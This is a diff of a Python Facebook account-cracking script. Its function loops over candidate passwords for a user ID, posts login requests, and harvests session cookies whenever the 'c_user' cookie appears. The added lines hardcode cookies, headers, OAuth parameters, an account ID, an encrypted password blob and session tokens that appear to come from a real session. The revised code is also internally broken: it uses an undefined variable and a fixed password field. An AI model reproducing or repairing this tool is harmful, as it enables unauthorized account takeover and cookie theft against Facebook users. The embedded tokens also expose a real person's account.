@@ -1320,55 +1320,77 @@ def p(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com').text
-            data = {
-        'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-        'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-        'email': uid,
-        'timezone': '-330',
-        'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-        'lgnrnd': '060331_lb2E',
-        'lgnjs': '1751375011',
-        'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/ffPPfPAABFAI',
-        'locale': 'hi_IN',
-        'next': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
-        'guid': 'f13465d1007fbcb28',
-        'prefill_contact_point': '',
-        'prefill_source': 'browser_dropdown',
-        'prefill_type': 'password',
-        'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-        'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
-        'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
-        'ps_l': '1',
-        'ps_n': '1',
-        'locale': 'hi_IN',
-        'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
-        'wd': '885x751',}
+            'datr': '7DnMaEaBSi1euh0ZrTxnFPXZ',
+            'sb': '7DnMaMKotlR75LUbGLYU-TYB',
+            'm_pixel_ratio': '2.4749999046325684',
+            'ps_l': '1',
+            'ps_n': '1',
+            'pas': '100056503155212%3AfxOzQdbFmo',
+            'dpr': '2.4749999046325684',
+            'wd': '437x973',
+            'fr': '02n8peqk75hF9D13g.AWcYnHXf1GZF8b7MXvQBW4q05cEXwaTcJhJCnUnlt93z2xfY_YY.BozDns..AAA.0.0.Bo1hLI.AWcm2HkPoopHsJCgNGiCAIgqHgw',}
             headers = {
-        'authority': 'www.facebook.com',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'max-age=0',
-        'content-type': 'application/x-www-form-urlencoded',
-        'dpr': '1',
-        'origin': 'https://www.facebook.com',
-        'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
-        'sec-ch-prefers-color-scheme': 'dark',
-        'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
-        'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-model': '""',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-ch-ua-platform-version': '"10.0.0"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-        'viewport-width': '885',}
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; V2060 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.7339.155 Mobile Safari/537.36',
+            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Android WebView";v="140"',
+            'x-response-format': 'JSONStream',
+            'sec-ch-ua-mobile': '?1',
+            'x-asbd-id': '359341',
+            'x-fb-lsd': 'AdEVi-OFg_s',
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': 'https://limited.facebook.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://limited.facebook.com/login.php?skip_api_login=1&api_key=1393952984244777&kid_directed_site=0&app_id=1393952984244777&signed_next=1&next=https://m.facebook.com/v16.0/dialog/oauth?app_id=1393952984244777&cbt=1758859215730&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfedd56e5da955addb%26domain%3Dwww.boomplay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.boomplay.com%252Ff8911011906172fa2%26relation%3Dopener&client_id=1393952984244777&display=touch&domain=www.boomplay.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.boomplay.com%2Fsongs%2F216051730&locale=en_US&logger_id=fb5ecf6aa44bb1de3&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df9bf310860cbd212d%26domain%3Dwww.boomplay.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.boomplay.com%252Ff8911011906172fa2%26relation%3Dopener%26frame%3Dfb8a321b81d3ff397&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v16.0&ret=login&fbapp_pres=0&tp=unspecified&cancel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46',
+            'accept-language': 'en-US,en;q=0.9',
+            'priority': 'u=1, i',} 
+            params = {
+            'api_key': '1393952984244777',
+            'auth_token': '3ea524ab821dcb9e2140fbe35e5e09fd',
+            'skip_api_login': '1',
+            'signed_next': '1',
+            'next': 'https://m.facebook.com/v16.0/dialog/oauth?app_id=1393952984244777&cbt=1758859978311&logger_id=2fb35fb5-cdb2-46af-8dc4-996548b0ec0b',
+            'refsrc': 'deprecated',
+            'app_id': '1393952984244777',
+            'cancel': 'https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46',
+            'lwv': '100',}
+            data = {
+            'm_ts': '1758859976',
+            'li': 'yBLWaNo3yCbGoJgrOxFDDjjk',
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': '100056503155212',
+            'prefill_contact_point': '100056503155212',
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'true',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '92004344361786634',
+            'encpass': '#PWD_BROWSER:5:1758859991:AWpQAJ78nsELQ6oAmTKN60TUqyU3S+4pPGhmFdKL40ndAsgorMtdauIzLDtczxHxR4kOLhmbNJkWpCygokCpNw8PfXHkkW2FIuFOnkmliVxJMjoA4sCgle6XrNEM5RuiTcxtyzWenyCyqw==',
+            'fb_dtsg': 'NAfup2Me3JHXJFN2yxBY35qKn-1LtNpMqJhQzaJ3AqYbs8PMFOvFhGw:0:0',
+            'jazoest': '24862',
+            'lsd': 'AdEVi-OFg_s',
+            '_dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE',
+            'csr': '',
+            'hsdp': '',
+            'hblp': '',
+            'sjsp': '',
+            'req': '1',
+            'fmt': '1',
+            'a': 'AYrzCMozrxxEkLpLMe4Y2HjtqtsmVGwYzrN5JRYYClldhdPtYgFp1Jf_aTSnrZs9GEMJRGEqpBnp7Yr7bbjZFjK5_l3XCV2rjhwTOtu5o4lWwg',
+            '_user': '0',}
             url = 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            session.headers.update(headers)
+            for k, v in cookies.items():
+                session.cookies.set(k, v, domain=".facebook.com")
+            resp = session.post(url, params=params, data=data, allow_redirects=True, timeout=30)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
